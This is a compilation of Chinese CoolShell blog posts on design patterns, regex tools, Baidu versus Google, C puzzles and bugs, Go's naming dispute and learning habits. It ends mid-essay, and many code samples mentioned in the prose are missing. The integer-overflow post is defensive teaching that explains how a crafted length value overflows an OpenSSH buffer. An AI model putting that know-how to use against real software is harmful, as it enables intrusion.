未来的企业，那些管理类的工具一定会被边缘化的，聊天类的会被打成一个通知中心，而创作类的会大放异彩，让大家直接在要干的事上进行沟通、交互和分享。（全文完）# 101个设计模式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn所以设计模式，实是是一种方法，一种为了解决某种或某类物定问题所使用的设计模型。据说，在编程语言方面有100多种设计模式，而在现实生活中，传说有上成千上万个模式，比如写书有写书的设计模式，写武侠的一种，言情的另一种，连官方的新闻稿件也有。言归正传，这个站点（）是向大家着力推荐的讲解编程方面设计模式的网站，除了GoF那经典的23个三大类的设计模式，还有Ｎ多的其它种类的设计模式。一共101个，最重要的是，它的这101个设计模式的写作模式如下：1. 模式的意图   2. 要解决什么样的问题   3. 模式的讨论   4. 模式的结构   5. 模式的业务示例   6. 实现模式的Checklist   7. 模式的规则   8. 代码示例（包括各种语言，如：Java, C++, PHP, Delphi…）# 正则表达式生成器作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn对正则表达式很头疼，是不是？每次看到都觉得像看天书似的，别说让人自己整一个出来了。下面这个网站可以帮你生成正则表达式，而且还可以根据不同的语言生成不同的代码示例，很强大。!txt2re.com打开上面那个网页，你会看到有三步。* 第一步，输出你想匹配的一个文本示例，然后点“Show Machted”，于是进入第二点。* 第二步，当你看到那花花绿绿的界面是不要头大（那个配色也太可怕了），那是这个会把你的这个字串每个字符都拆出来，并把单词分隔。于是，你可以点击那些花绿格子间的链接来组织你的正规表达式。，比如：c表示任意字符，还有什么int,day,string之流的东西。（相当ugly的界面）在这一步，你一点要点点什么，不然不会进入第三步。* 第三步，选择一个编程语言，然后你可以看到相关的代码示例。语言支持：Perl PHP Python Java Javascript ColdFusion C C++ Ruby VB VBScript J#.net C#.net C++.net VB.net （这么多）总之，这是一个很酷，但却界面很丑陋的在线的正则表达式生成工具。
# 百度为什么掉队了作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天早上看到一篇文章《百度不要用户》这篇文章里的大意是：百度错过了移动互联网，等反应过来的时候，在2013年猛收购了一些公司来追赶对手或是时代，但都不成功，然后又开始后过来走到技术，大力发展AI，可惜，AI又是一个不是很成熟的事，需要没有上限的投入，而且在短期内看不到盈利的事，然而整个KPI又设计在了盈利上，最后导致内部内耗严重，人才和管理层流失，最终离用户越来越远。文章中有一个段落的标题是【做决策的是技术】，其中有话是这样的——> 在“重技术、轻运营”的百度，产品的主导权和优先权在技术手里，产品和运营的立项话语权相对轻很多。如果是在 PC > 时代，这无可厚非，但在移动互联网时代，这就有很大的问题。这就是中国这个社会的价值观了，整个社会价值观从本质上来说是不待见技术的—— **平时都说技术不重要，但是当有问题出现的的时候，他们都会把问题都推到技术上** 。虽然我同意这篇文章中大多数观点，但是我对“做决策的是技术造成了问题”有很大的不同意，并不是我是技术人员，我只会站在我的角度上思考问题，而且，这个结论就是错的。
要证明这个事，我们就需要找一个反例，这个反例就是Google。其实，文章中所有的因为移动互联网出现而对传统互联网造成挑战的问题，Google其实都遇到了，然而，Google却走了一条完全与百度不一样的路。当时，Facebook如日中天的时候，Google也有很多人才流失到了Facebook，而Google的所有产品线都受到了来自移动互联网的挑战，人们不再打开电脑了，而且把时间全部放在了手机上，于是，Google的搜索也变得麻烦了，就算Google也做了一个搜索的App，也没人用过。Google还做了Google Plus的社交产品，最终也是以失败告终。除此之外，还有众多的Google产品都在移动互联网下玩完，比如：Google Talk/Hangouts, Google Wave，Google Buzz，Google Reader……还有电商网站Google Checkout, Google Offers……如果你要看Google死掉的产品你可以看一下这个网页 – Killed By Google ，一共200多个产品，有好多你都没有听说过。另外一方面，Google和百度一样，在云计算方面都没有跟上时代。百度的李彦宏，2010年03月28日，在中国IT领袖峰会上说，“云计算不客气一点讲是新瓶装旧酒，没有新东西”，可见出了战略上的错误。而Google则是云计算的倡导者，Google在云计算上的技术造诣绝对不会比任何一家公司差，但是Google走了一条很曲高和寡的路——Google App Engine，直接跨过IaaS上到PaaS，最终错失市场，现在整合进Google Cloud Platform，提供一整套的多种形式的云服务，尤其是其AI、大数据和数据中心的运营能力，才挽回一点面子，但还是被AWS和Azure抛在后面。而百度那边呢，百度的“百度云”做成了“百度网盘”……
可以看见，在过去10年，Google还是比较危险的，同样和是搜索引擎起家的百度所面临的风险和危机是一样的——流量入口开始发生转移，导致技术架构和方案也跟着一起转变。但是，今天的Google依然很成功，也是一个破万亿市值的公司，为什么呢？是不是因为Google那边是运营和产品说了算呢？显然不是，如果是那样，Google今天的结局可能和百度也会很类似。Google 牛逼的原因有很多，我想在这里重点说几个跟开源有关的产品，让大家感受一下Google是怎么在落后的地方力挽狂澜的，这实在让人细思极恐：* **Chrome浏览器** 。Google面对的竞争对手是微软的IE，这个用户入口如果失去了，Google的收入至少少一半（注：今天的天天在做慈善的Bill Gates，当年在浏览器市场上用操作系统垄断的方式把网景和Java都干得痛不欲生，最终引发反垄断诉讼才变得开放一点）。所以，为了要从当时占市场份额98%以上的IE抢市场，开源是一个非常好的策略（当时，还有用户体验，安全性和性能等其它因素）。* **Android 操作系统** 。Android 操作系统本质上是为了对抗 Apple和Microsoft，这两个公司在操作系统上耕耘多年，而未来的手机入口成为必争之地，如果Google错失了这个阵地，那么，Google的业务量会受到巨大的影响。所以，Google必需争夺，而且还必需用开源来搞。试想，如果Google的Android不开源的话，今天的智能手机市场很有可能是Apple和Micorsoft/Nokia唱主角了。正因为开源了Android，所以可以让更多的人和企业以Android的方式参与进来，从而对Apple和Microsoft形成真正的对抗。
* **Kubernetes & CNCF**。很明显，Kubernetes和后来的CNCF把云计算提升到了另一个层次——不再以资源虚拟化的云设施，而是以应用/服务/API调度为主的云计算。这个真的很猛，其目的主要也是要用一个新的云计算的形式来遏制AWS和Azure的发展，想通过Cloud Native的方式把云计算的游戏规则改变，从而让GCP更好用，另外，其也是开源的，并成立了了开源基金会，似乎是在告诉大众，无产阶级联合起来，对抗巨头。如果Kubernetes像Google的的论文不开源的话，估计也会错失当时竞争异常激烈的容器调度市场。开源并不是Google的核心文化，Google有太多的好的东西，他都不开源，Google做死的产品几百个，但宁可放到垃圾桶里，他们也不会开源出来。所以， **Google的开源，其本质上来说，还是为其商业逻辑服务的——为了抢夺别人的市场，为了后来者居上** 。当然，Google比百度成功的原因还不仅上面这些，上面这些只是想让大家看到Google的思路。这些思路，很明显都是技术的思路，不是运营的思路。Google虽然有技术，但也不是在所有的技术上都有优势，看看人家是怎么在自己并没有优势的地方抢市场的玩法，可能会对理解百度为什么掉队了会有更准确的帮助。
最后，Wikipedia上有几个和Google有关清单，可以看看。* Google 并购公司的清单 – Google 的并了购了240多家公司。   * Google 的产品清单 – Google 的产品簇简直就是一个大杂烩 。   * Google 的APP清单 – 看看Google的APP全家桶，数百个应用。看完这些清单，你可能会感觉到，Google 这厮也是什么都在干，所以，死的也很多。但这种大规模试错的产能，并不是任何一个公司都有的。百度和Google的员工数量我在网上找了一下，只能看到2018年的数据，2018年百度有45000人，Google有98000人。人数少了一半，但是产能少了可不只一半。另外，你再仔细看一下上面的清单，你会看得出来，Google做的这些产品和方向都有一种浓浓的技术味……而且，你会觉得，在技术上折腾，就算是失败了，也能让人感觉得到这家公司和团队不会差……与《百度不要用户》这篇文章中所说的，百度的问题是“技术人员话语太强”，我觉得百度的问题是，不再做技术了……而公司出现了混乱的思维方式，无论是不是技术人员，谁都不会思考和做决定了……（全文完）# 输出从1到1000的数
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn有这样一个面试题—— **请把从1到1000的数打印出来，但你不能使用任何的循环语句或是条件语句。更不能写1000个printf或是cout** 。 **用C/C++语言** 。我相信，大多数人一开始你可能想到的是递归算法：当然，题目中说了不能使用条件语句，所以，上面那种解法的不符合题意的，因为还是变向地使用了条件表达式。不过，我们可以用别的方法来让这个递归终止，比如：除以零，当程序crash，呵呵。还有这样退出递归的：void yesprint(int i);     void noprint(int i);还有下面这些各种各样的解法：不过，print用得多了一些。我们可以用宏嘛。不过，我们应该使用C++的一些特性，比如：使用构造函数};或是更为NB的Template：最后来个BT一点的：本文来自:*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# C语言的整型溢出问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
整型溢出有点老生常谈了，bla, bla, bla… 但似乎没有引起多少人的重视。整型溢出会有可能导致缓冲区溢出，缓冲区溢出会导致各种黑客攻击，比如最近OpenSSL的heartbleed事件，就是一个buffer overread的事件。在这里写下这篇文章，希望大家都了解一下整型溢出，编译器的行为，以及如何防范，以写出更安全的代码。目录* 什么是整型溢出   * 整型溢出的危害     * 示例一：整形溢出导致死循环     * 示例二：整形转型时的溢出     * 示例三：分配内存     * 示例四：缓冲区溢出导致安全问题     * 示例五：size_t 的溢出   * 关于编译器的行为     * 编译器优化     * 花絮：编译器的彩蛋   * 正确检测整型溢出     * 二分取中搜索算法中的溢出     * 上溢出和下溢出的检查   * 其它#### 什么是整型溢出C语言的整型问题相信大家并不陌生了。对于整型溢出，分为无符号整型溢出和有符号整型溢出。**对于unsigned整型溢出，C的规范是有定义的** ——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。例如：
unsigned char x = 0xff;     printf("%d\n", ++x);上面的代码会输出：0 （因为0xff + 1是256，与2^8求模后就是0）**对于signed整型的溢出，C的规范定义是“undefined behavior”** ，也就是说，编译器爱怎么实现就怎么实现。对于大多数编译器来说，算得啥就是啥。比如：signed char x =0x7f; //注：0xff就是-1了，因为最高位是1也就是负数了     printf("%d\n", ++x);上面的代码会输出：-128，因为0x7f + 0x01得到0x80，也就是二进制的1000 0000，符号位为1，负数，后面为全0，就是负的最小数，即-128。另外，千万别以为signed整型溢出就是负数，这个是不定的。比如：signed char x = 0x7f;     signed char y = 0x05;     signed char r = x * y;     printf("%d\n", r);上面的代码会输出：123相信对于这些大家不会陌生了。#### 整型溢出的危害下面说一下，整型溢出的危害。
##### 示例一：整形溢出导致死循环上面这段代码可能是很多程序员都喜欢写的代码（我在很多代码里看到过多次），其中的MAX_LEN 可能会是个比较大的整型，比如32767，我们知道short是16bits，取值范围是-32768 到 32767 之间。但是，上面的while循环代码有可能会造成整型溢出，而len又是个有符号的整型，所以可能会成负数，导致不断地死循环。##### 示例二：整形转型时的溢出return memcpy(mybuf, buf, len);     }上面这个例子中，还是[1]处的if语句，看上去没有会问题，但是len是个signed int，而memcpy则需一个size_t的len，也就是一个unsigned 类型。于是，len会被提升为unsigned，此时，如果我们给len传一个负数，会通过了if的检查，但在memcpy里会被提升为一个正数，于是我们的mybuf就是overflow了。这个会导致mybuf缓冲区后面的数据被重写。##### 示例三：分配内存关于整数溢出导致堆溢出的很典型的例子是，OpenSSH Challenge-Response SKEY/BSD_AUTH 远程缓冲区溢出漏洞。下面这段有问题的代码摘自OpenSSH的代码中的auth2-chall.c中的input_userauth_info_response() 函数:
上面这个代码中，nresp是size_t类型（size_t一般就是unsigned int/long int），这个示例是一个解数据包的示例，一般来说，数据包中都会有一个len，然后后面是data。如果我们精心准备一个len，比如：1073741825（在32位系统上，指针占4个字节，unsigned int的最大值是0xffffffff，我们只要提供0xffffffff/4 的值——0x40000000，这里我们设置了0x4000000 + 1）， nresp就会读到这个值，然后nresp _sizeof(char_ )就成了 1073741825 * 4，于是溢出，结果成为了 0x100000004，然后求模，得到4。于是，malloc(4)，于是后面的for循环1073741825 次，就可以干环事了（经过0x40000001的循环,用户的数据早已覆盖了xmalloc原先分配的4字节的空间以及后面的数据，包括程序代码，函数指针，于是就可以改写程序逻辑。关于更多的东西，你可以看一下这篇文章《Survey of Protections from Buffer-Overflow Attacks》）。
##### 示例四：缓冲区溢出导致安全问题memcpy(mybuf, buf1, len1);     memcpy(mybuf + len1, buf2, len2);do_some_stuff(mybuf);return 0;     }上面这个例子本来是想把buf1和buf2的内容copy到mybuf里，其中怕len1 + len2超过256 还做了判断，但是，如果len1+len2溢出了，根据unsigned的特性，其会与2^32求模，所以，基本上来说，上面代码中的[1]处有可能为假的。（注：通常来说，在这种情况下，如果你开启- O代码优化选项，那个if语句块就全部被和谐掉了——被编译器给删除了）比如，你可以测试一下 len1=0x104， len2 = 0xfffffffc 的情况。##### 示例五：size_t 的溢出for (int i= strlen(s)-1;  i>=0; i--)  { ... }for (int i=v.size()-1; i>=0; i--)  { ... }上面这两个示例是我们经常用的从尾部遍历一个数组的for循环。第一个是字符串，第二个是C++中的vector容器。strlen()和vector::size()返回的都是 size_t，size_t在32位系统下就是一个unsigned int。你想想，如果strlen(s)和v.size() 都是0呢？这个循环会成为个什么情况？于是strlen(s) – 1 和 v.size() – 1 都不会成为 -1，而是成为了 (unsigned int)(-1)，一个正的最大数。导致你的程序越界访问。
这样的例子有很多很多，这些整型溢出的问题如果在关键的地方，尤其是在搭配有用户输入的地方，如果被黑客利用了，就会导致很严重的安全问题。#### 关于编译器的行为在谈一下如何正确的检查整型溢出之前，我们还要来学习一下编译器的一些东西。请别怪我罗嗦。##### 编译器优化如何检查整型溢出或是整型变量是否合法有时候是一件很麻烦的事情，就像上面的第四个例子一样，编译的优化参数-O/-O2/-O3基本上会假设你的程序不会有整形溢出。会把你的代码中检查溢出的代码给优化掉。关于编译器的优化，在这里再举个例子，假设我们有下面的代码（又是一个相当相当常见的代码）：int len;     char* data;上面这段代码中，len 和 data 配套使用，我们害怕len的值是非法的，或是len溢出了，于是我们写下了if语句来检查。这段代码在- O的参数下正常。但是在-O2的编译选项下，整个if语句块被优化掉了。你可以写个小程序，在gcc下编译（我的版本是4.4.7，记得加上-O2和-g参数），然后用gdb调试时，用disass /m命信输出汇编，你会看到下面的结果（你可以看到整个if语句块没有任何的汇编代码——直接被编译器和谐掉了）：
7 int len = 10;     8 char* data = (char *)malloc(len);     0x00000000004004d4 <+4>: mov $0xa,%edi     0x00000000004004d9 <+9>: callq 0x4003b8 <[[email protected]](/cdn-cgi/l/email-protection)>对此，你需要把上面 char* 转型成 uintptr_t 或是 size_t，说白了也就是把char*转成unsigned的数据结构，if语句块就无法被优化了。如下所示：关于这个事，你可以看一下C99的规范说明《 ISO/IEC 9899:1999 C specification 》第 §6.5.6 页，第8点，我截个图如下：（这段话的意思是定义了指针+/-一个整型的行为，如果越界了，则行为是undefined）注意上面标红线的地方，说如果指针指在数组范围内没事，如果越界了就是undefined，也就是说这事交给编译器实现了，编译器想咋干咋干，那怕你想把其优化掉也可以。在这里要重点说一下， **C语言中的一个大恶魔—— Undefined! 这里都是“野兽出没”的地方，你一定要小心小心再小心** 。
##### 花絮：编译器的彩蛋上面说了所谓的undefined行为就全权交给编译器实现，gcc在1.17版本下对于undefined的行为还玩了个彩蛋（参看Wikipedia）。下面gcc 1.17版本下的遭遇undefined行为时，gcc在unix发行版下玩的彩蛋的源代码。我们可以看到，它会去尝试去执行一些游戏NetHack， Rogue 或是Emacs的 Towers of Hanoi，如果找不到，就输出一条NB的报错。execl("/usr/games/hack", "#pragma", 0); // try to run the game NetHack     execl("/usr/games/rogue", "#pragma", 0); // try to run the game Rogue     // try to run the Tower's of Hanoi simulation in Emacs.     execl("/usr/new/emacs", "-f","hanoi","9","-kill",0);     execl("/usr/local/emacs","-f","hanoi","9","-kill",0); // same as above     fatal("You are in a maze of twisty compiler features, all different");
#### 正确检测整型溢出在看过编译器的这些行为后，你应该会明白——“ **在整型溢出之前，一定要做检查，不然，就太晚了** ”。我们来看一段代码：上面这段代码有两个风险： **1）有符号转无符号** ， **2）整型溢出** 。这两个情况在前面的那些示例中你都应该看到了。 **所以，你千万不要把任何检查的代码写在 s = m + n 这条语名后面，不然就太晚了** 。undefined行为就会出现了——用句纯正的英文表达就是——“Dragon is here”——你什么也控制不住了。（注意：有些初学者也许会以为size_t是无符号的，而根据优先级 m 和 n 会被提升到unsigned int。其实不是这样的，m 和 n 还是signed int，m + n 的结果也是signed int，然后再把这个结果转成unsigned int 赋值给s）比如，下面的代码是错的：上面的代码中，大家要注意 **(SIZE_MAX – m < n)** 这个判断，为什么不用m + n > SIZE_MAX呢？因为，如果 m + n 溢出后，就被截断了，所以表达式恒真，也就检测不出来了。另外，这个表达式中，m和n分别会被提升为unsigned。
但是上面的代码是错的，因为：1）检查的太晚了，if之前编译器的undefined行为就已经出来了（你不知道什么会发生）。2）就像前面说的一样，(SIZE_MAX – m < n) 可能会被编译器优化掉。3）另外，SIZE_MAX是size_t的最大值，size_t在64位系统下是64位的，严谨点应该用INT_MAX或是UINT_MAX所以，正确的代码应该是下面这样：在《苹果安全编码规范》（PDF）中，第28页的代码中：如果n和m都是signed int，那么这段代码是错的。正确的应该像上面的那个例子一样，至少要在n _m时要把 n 和 m 给 cast 成 size_t。因为，n_ m可能已经溢出了，已经undefined了，undefined的代码转成size_t已经没什么意义了。（如果m和n是unsigned int，也会溢出），上面的代码仅在m和n是size_t的时候才有效。不管怎么说，《苹果安全编码规范》绝对值得你去读一读。##### 二分取中搜索算法中的溢出我们再来看一个二分取中搜索算法（binary search），大多数人都会写成下面这个样子：上面这个代码中，你可能会有这样的想法：
1） 我们应该用size_t来做len, low, high, mid这些变量的类型。没错，应该是这样的。但是如果这样，你要小心第四行 int high = len -1; 如果len为0，那么就“high大发了”。2） 无论你用不用size_t。我们在计算mid = (low+high)/2; 的时候，(low + high) 都可以溢出。正确的写法应该是：int mid = low + (high - low)/2;##### 上溢出和下溢出的检查前面的代码只判断了正数的上溢出overflow，没有判断负数的下溢出underflow。让们来看看怎么判断：对于加法，还好。对于乘法，就会很复杂（下面的代码太夸张了）：result = si_a * si_b;     }更多的防止在操作中整型溢出的安全代码可以参看《INT32-C. Ensure that operations on signed integers do not result in overflow》#### 其它对于C++来说，你应该使用STL中的numeric_limits::max() 来检查溢出。另外，微软的SafeInt类是一个可以帮你远理上面这些很tricky的类，下载地址：
对于Java 来说，一种是用JDK 1.7中Math库下的safe打头的函数，如safeAdd()和safeMultiply()，另一种用更大尺寸的数据类型，最大可以到BigInteger。可见，写一个安全的代码并不容易，尤其对于C/C++来说。对于黑客来说，他们只需要搜一下开源软件中代码有memcpy/strcpy之类的地方，然后看一看其周边的代码，是否可以通过用户的输入来影响，如果有的话，你就惨了。**参考** ：* Basic Integer Overflow* OWASP：Integer overflow* C compilers may silently discard some wraparound checks* Apple Secure Coding Guide* Wikipedia: Undefined Behavior* INT32-C. Ensure that operations on signed integers do not result in overflow最后， 不好意思，这篇文章可能罗嗦了一些，大家见谅。（全文完）# Go语言更名Issue 9？作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cnGo语言出了一个Issue，这个Issue的链接在这里：http://code.google.com/p/go/issues/detail?id=9 ，这个Issue的编号是9描述是：> I have already used the name for *MY* programming language意思是，已经有人使用了这go作为其语言的命名了。报告者叫fmccabe，他说到：> > 我已经从事于我的一个编程语言，而且都10年了。并且都有很多论文发表了。我非常感激你们Google如果把这个名字修改一下，因为我是不会修改我的语言的名字的！于是，开始了回贴：* 1楼跟贴说，“给个链接看看”   * fmccabe在2楼说：“我出版了本书在lulu.com上”。   * 3楼的说，“是的，你的语言叫“Go!”，你的书在：”   * 4楼说：“三楼你是对的，LZ的语言是‘Let’s Go!’或‘Go!’，Google的叫‘go’，根本就不同啊。”   * LZ不同意在5楼说：“是的，我的语言叫Go!，书名叫：Let’s Go!。而这里的问题不是Google的go是否会有名，而是公平性。”
好事者从来都不少，后面的贴子可想而知了。众多网友纷纷支持LZ，让Google改名。* 11楼让LZ找个便宜的律师，还说Google的钱袋很深的。   * 14楼的DailyFinance.com的一个MS记者的人也找上了。   * 17楼建议Google改名Goo 或Foo于是，再往后的回贴，众网友们开始纷纷帮Google的go语言改名：* 25楼说，Goo也被用了。   * 28楼说，应该叫GOOP = Google Object Oriented Programming   * 29楼说，叫ogle   * 30楼说，叫Goat   * 31楼说，JAgo: Just Another go （42楼说，Jago也被用了）   * 36楼说，go2。并说明，C++也使用了C的名字，用++做了后缀。所以，可以go2   * 40楼说，为什么不叫Golang?Erlang – “Ericsson Language”和Golang – “Google Language”，多配啊。   * 50楼说，干脆叫“Do”得了。   * 53楼说，叫gone也可以啊。   * 69楼说，大家别吵了，这是go的第9个issue，叫Issue 9最好。
后面的网友们纷纷支持Issue 9， **Issue 9** 的呼声最高。截止本文发表，大约有710个跟贴，在reddit.com上也在580多个。网友的力量就是大啊。星期五了，耗子祝大家周末快乐！# C语言中史上最愚蠢的Bug作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文来自“The most stupid C bug ever”，很有意思，分享给大家。我相信这样的bug，就算你是高手你也会犯的。你来看看作者犯的这个Bug吧。。首先，作者想用一段程序来创建一个文件，如果有文件名的话，就创建真正的文件，如果没有的话，就调用?tmpfile()?创建临时文件。他这段程序就是HTTP下载的C程序。code==200就是HTTP的返回码。但是这个程序，只能在Unix/Linux下工作，因为 Microsoft 的?tmpfile()的实现?居然选择了 C:\ 作为临时文件的存放目录，这对于那些没有管理员权限的人来说就出大问题了，在Windows 7下，就算你有管理员权限也会有问题。所以，上面的程序在Windows平台下需要用不同的方式来处理，不能直接使用Windows的tmpfile()函数。
于是作者就先把这个问题记下来，在注释中写下了FIXME：// FIXME Win32 native version fails here because     //   Microsoft's version of tmpfile() creates the file in C:\     g = fname ? fopen(fname, "w+") : tmpfile();     }然后，作者觉得需要写一个跨平台的编译：然后，作者觉得这样实现很不好，会发现名字冲突，因为这样一来这个函数太难看了。于是他重构了一下他的代码——写一个自己实现的tmpfile() – w32_tmpfile，然后，在Windows 下用宏定义来重命名这个函数为tmpfile()。（陈皓注：这种用法是比较标准的跨平台代码的写法）#ifdef _WIN32     #define tmpfile w32_tmpfile     #endif搞定！编译程序，运行。靠！居然没有调用到我的w32_tmpfile()，什么问题？调试，单步跟踪，果然没有调用到！难道是问号表达式有问题？改成if – else 语句，好了！
问号表达式不应该有问题吧，难道我们的宏对问号表达式不起作用，这难道是编译器的预编译的一个bug？作者怀疑到。现在我们把所有的代码连在一起看，并比较一下：**能正常工作的代码**#ifdef _WIN32     #  define tmpfile w32_tmpfile     #endif**不能正常工作的代码**#ifdef _WIN32     #  define tmpfile w32_tmpfile     #endif也许你在一开始就看到了这个bug，但是作者没有。所有的问题都出在注释上：/* Write new file (plus allow reading once we finish) */     // FIXME Win32 native version fails here because     //     Microsoft's version of tmpfile() creates the file in C:\**你看到了最后那个C:\吗？在C中，“\” 代表此行没有结束，于是，后面的代码也成了注释。这就是这个bug的真正原因** ！而之所以改成if-else能工作的原因是因为作者注释了老的问号表达式的代码，所以，那段能工作的代码成了：
我相信，当作者找到这个问题的原因后，一定会骂一句“妈的”！我也相信，这个bug花费了作者很多时间！最后，我也share一个我以前犯的一个错。我有一个小函数，需要传入一个int* pInt的类型，然后我需要在我的代码里 把这个int* pInt作除数。于是我的代码成了下面的这个样子：> float result = num/*pInt;   >  …. > > /* some comments */ > > -x<10 ? f(result):f(-result);因为我在我当时用vi编写代码，所以没有语法高亮，而我的程序都编译通过了，但是却出现了很奇怪的事。我也不知道，用gdb调式的时候，发现有些语句直接就过了。这个问题让我花了很多时间，最后发现问题原来是没有空格导致的，TNND，下面我用代码高亮的插件来显示上面的代码，float result = num/*pInt;     ..../*  some comments */-x<10 ? f(result):f(-result);Holly Shit! 我的代码成了：`float result = num-x<10 ? f(result):f(-result);`
妈的！我的这个错误在愚蠢程度上和上面那个作者出的错误有一拼。（全文完）# 程序员的谎谬之言还是至理名言？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn有朋友（网友never）在酷壳Coolshell.cn的留言版上问我，为什么关注了这很多的东西，我想我可以用下文来回答这位网友，因为我和作者的观点几乎一致。这篇文章由 ALAN SKORKIN写的 “The Greatest Developer Fallacy Or The Wisest Words You’ll Ever Hear?” ，我把其全文翻译如下，我很喜欢这篇文章，希望你也喜欢。（翻译的也许不好，欢迎指正）—————————————————正文分隔线——————————————————!Wisdom“ ** _I will learn it when I need it –_ 我会在我需要的时候再学**“！我听到这句已经很多年了。这对于一个高速变化的软件行业环境来说，这似乎是一个非常实用的态度。 在某些方面这的确很实用主义，不过在其它的方面，我为这句话感到很不爽。这句话变成了整个软件行业的福音，但却没有让我们的软件行业变得更好。其问题在于， **这句话伪装在于其听上去像是一个智慧的有经验的开发者说的，但是人们只是以此为借口而随波逐流** 。实在是有太多的东西需要我们去了解，我们也的确需要在工作当中来学习这些东西。但是， “在工作中学习”和“根据遇到的问题捡知识”这两者有着巨大的不同。
* 另外，目前整个软件行业越来越需要一堆多面手，也许现在已经是这样了，只是我还没有注意到。当然，我也不喜欢这种情。现在，好像没有人愿意花更多的时间来把某一个东西学好学深学扎实，比如 计算机科学的基础知识，或是最新的你正在使用的技术，甚至你在最近几年内每天都在使用其编码的程序语言（参考：Java is passed by value）（ **译注：** 我在如何学好C++一文的回复中已经看到一些这样的人）。何苦呢？你会在你的学习路途中看到这些东西被更新，被废弃，并可能变得小众化。我和很多不同的人讨论过很多次，但是好像没有人意识到这是一个问题。 “ **哥们，做个实用主义的人吧** ”。* 与此同时，我们所有的人都在相互地克隆和模仿（ **译注：** 参看中国的C2C）。你需要一个Java程序员，我是一个Java程序员，你也是一个Java程序员，我的邻居也是一个Java程序员。我们之间有什么差别？其实，基本没有差别。好吧，我有一些jQuery的经历，太好，所以，你知道怎么来做一个折叠式的菜单？当然，我可以Google一下，然后剽窃别人最好的代码给你 :)（ **译注：** 参看“十条不错的编程观点”中的”Googling it” is okay）。
* 与此同时，你需要招聘到真正的专业级的人物（比如，你需要写一个很牛的解析程序来以图形化展示一下后台数据），那么你可能需要准备足够的啤酒和三明治，因为你可很有一段时间找不到这样的人。好了，其实，是有一些方法来区分，比如，我有更好的沟通能力，这就是为什么我可以做得更好。这是相当重要的，但是， **如果我们用软能力而不是用技术能力来区分程序员的好坏 – 是不是有那么点反常和变态** 。我们所有人都可以沟通得很好，但是我们的代码乱成一团 :)。该死的，我本不应该说这事，我也有一点全才的样子。当然，我觉得我自己是一个 T型人才（ **译注** ：即有深度又有广度），但是如果我们都非常诚实的话，我们会发现更多的人的能力是“横线型”或是“下划线型”的（ **译注** ：广度型），其中只有很少数的人才是有能力的。而我们的“T型人才”在这些人中就像一个巨大的钟乳石。 **你看上去像一个专家，但也许你从没有做过专家** ，这就是专才在满是全才的世界中的优势。目录* 投资你的未来   * 你不知道你不知道的   * 你学得足够快吗？   * 为什么我应该关心#### 投资你的未来我不想以说教的方式来告诉你人们应该怎么样来投资自己未来的职业生涯，因为每个人都知道我们应该怎么做。很多人也许认为他们正在投资，他们努力奋斗，写很多的代码，并也做一些阅读，当然，这样坚持下去，也许十年也可以成为一个专家，而成为一个咨深专家可能需要20年（我会不断地说这些观点，总有一天我会把这个事说明白 :) ）。但是，如果真是这样的吧，每一个老家伙都会成为各个方面的专家，当然，事实是不会这样的。也许是因为人们不知道如何发展他们的专长（这是事实），但我私下里却怀疑， **大家缺少的是热情而不是知识** 。我所说的这些东西难道不都是这样的原因吗？
我完全跑题了。“在专业上投资未来”只是这些流行语中的一个，而重点是那句话 – “ ** _I will learn it when I need it –_ 我会在我需要的时候再学**”。对我老爸来说这样做挺好，迄今为止对我也有效。但是让我们换一个角度看看，比如金融方面，如果我们说：“ **我会在我需要钱的时候再去进行投资** ”。在这句话上面那个实用主义的光环就不那么漂亮了。#### 你不知道你不知道的我们都有过这样的时候，当我们痛苦地在解决一个问题的时候，有人突然告诉你一个算法或是一个技术，其把这个问题变得又快又简单。是的，有人告诉你一个容易的方法是一件很幸运的事，否则你可能需要花上数天或数周才能找到解决方法，并且事情可能会变得一团糟。你不会因此而被批评，因为你不知道你所不知道的东西。对此，“ ** _I will learn it when I need it –_ 我会在我需要的时候再学**”在这个时候就走不通了。因为， **你不可能学习那些你以为不存在的东西** 。Google做了很多的工作来减轻和缓解这样的问题，但并不完美。在一个陌生的环境下面对着一堆陌生的问题，会让你非常非常地痛苦，除非你知道你所面对的是什么（例如：如果你对搜索和约束传播（ _constraint propagation_ ）有点了解的话，那你就可能 容易地解决数独问题，否则的话， 这的确是 非常 难的）。你无法学习一种不知道或是你不知道用在哪里的算法。你也不可能去用一个你以为不存在的技术去解决一个问题。同样，你身边也不可以一直都有一个高人随时在给你指引正确的方向。我敢打赌， **这个世界上有几十亿行代码可以被 几百万行更快，更清楚，更简单的代码所取代，因为无论是谁来写，他都不可能知道他所不知道的东西** 。
我想在这里成为这个观点的反方，如果我们知道我们有哪些东西我们不知道，那么我们就知道我们需要去关注哪些东西。粗浅地尽可能的大范围的知道这些东西，那么，我们就可以在遇到问题的时候明白我们应该去更深地学什么样的知识。但是，这样来做在实际上并不有效，因为， **这些浮云般的知识不会让你记下来** ，我们的大脑不是这样工作的。如果我们不去强化或是深度挖掘去消化这些概念， 我们的大脑会很快地 把这些信息标为不重要并换页出去，这么做无非就是在浪费时间（你回头想一想你那些“填鸭式”的死记硬背的知识，你今天还记得吗？）然而，对于那些你集中精力深度研究过的东西——并伴随着你的兴趣的东西——你会收获到扎实的知识（那是你大脑里实际存下的不会忘的东西）。我的爷爷是一个核物理学家，数十年的在工作中获得这个领域中更深的知识让他今天成为了一个专家，同时也让他成为了一个优秀的数学家，不错的化学家，非常好的地理学家，还是一个合格的生物学家，等等。只需要一些 观察性的证据 你就知道 **广度的知识是深度研究的副产品** 。#### 你学得足够快吗？!Learn 